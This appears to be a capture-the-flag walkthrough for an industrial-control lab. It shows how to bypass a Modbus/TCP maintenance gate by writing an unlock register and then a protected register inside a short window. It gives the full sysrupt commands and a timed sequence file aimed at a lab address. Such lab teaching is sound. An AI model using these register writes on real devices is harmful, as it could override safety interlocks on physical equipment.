# Challenge 7 — Maintenance Override

**Protocol:** Modbus/TCP · **Port:** 502/tcp · **Toolkit module:** `modbus`

---

## The Story

A maintenance-override path is gated behind an unlock register and a short time window. Find
both, and land your write inside the window before it closes.

## What You Know

- Target is `10.0.1.1:502`.
- There's a gate register that must be set before a protected register accepts writes.
- The window between unlock and write is short — a normal two-command shell session (two separate
  connections, human reaction time in between) is unlikely to make it in time. You need both
  commands to fire over the *same* connection, back-to-back.

---

## Step 1: Map the register space

<details>
<summary>Hint</summary>

Read broadly first — both the sensor/status side and anything that looks like a lock/gate flag.
</details>

<details>
<summary>Show command</summary>

```bash
./bin/sysrupt target set 10.0.1.1
./bin/sysrupt modbus read-input 0 16
./bin/sysrupt modbus write 20 1       # try the suspected unlock register
```
</details>

## Step 2: Confirm the gate is real and find the expiry

<details>
<summary>Hint</summary>

If a direct write to the protected register fails while unlocked "too late," there's a timer
somewhere. Look for a register that counts down or flips back after unlocking.
</details>

<details>
<summary>Show command</summary>

```bash
./bin/sysrupt modbus read-input 70 6
```
</details>

## Step 3: Build a timed sequence instead of typing two commands by hand

<details>
<summary>Hint</summary>

The `sequence` engine runs its steps over one persistent connection with a monotonic clock,
which is what makes landing inside a short window realistic. Typing two separate `sysrupt`
invocations manually opens two separate connections and is too slow.
</details>

<details>
<summary>Show command</summary>

Save as `maint.seq.json`:

```json
{
  "name": "maint-override",
  "steps": [
    { "command": "modbus write 20 1" },
    { "command": "modbus write 21 100", "deadline_ms": 1800 },
    { "command": "modbus verify 73 100 --input", "delay_before_ms": 200 }
  ]
}
```

- `"deadline_ms"` — this step must finish within that many ms of the sequence starting.
- `"delay_before_ms"` — wait this long before running the step (used here to give the device a
  moment before verifying).

```bash
./bin/sysrupt sequence validate maint.seq.json
./bin/sysrupt sequence run maint.seq.json
```
</details>

## Step 4: Confirm it held

<details>
<summary>Hint</summary>

A write that lands inside the window but gets silently reverted a moment later looks identical
to success at first glance — check again after a short pause.
</details>

<details>
<summary>Show command</summary>

```bash
./bin/sysrupt modbus verify 21 100
```
</details>

## What You Learned

- Why a TOCTOU-style gate (unlock → short window → protected write) defeats a naive two-command
  shell session, and how a persistent-connection sequence engine solves that.
- How to build and validate a `sysrupt sequence` JSON file with `deadline_ms`/`delay_before_ms`.
- To re-check a write after the fact rather than trusting the immediate response, in case of a
  silent revert.
